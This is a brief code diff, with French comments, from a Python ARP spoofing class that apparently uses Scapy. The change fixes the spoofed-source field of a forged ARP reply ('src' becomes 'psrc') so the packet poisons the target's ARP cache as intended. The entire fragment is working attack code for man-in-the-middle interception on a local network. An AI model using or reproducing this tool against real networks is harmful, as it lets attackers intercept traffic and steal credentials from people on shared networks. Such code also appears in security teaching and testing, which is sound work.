@@ -56,7 +56,7 @@ class ArpSpoofer:
         # On obtient l'adresse mac du destinataire via la fonction get_mac
         # hwdst se traduit : "l'adresse ip (src) est à ..."
         packet = ARP(op=2, pdst=target_ip, hwdst=self.get_mac(target_ip),
-                           src=spoof_ip)
+                           psrc=spoof_ip)
 
         # On envoie la trame
         send(packet, verbose=False)
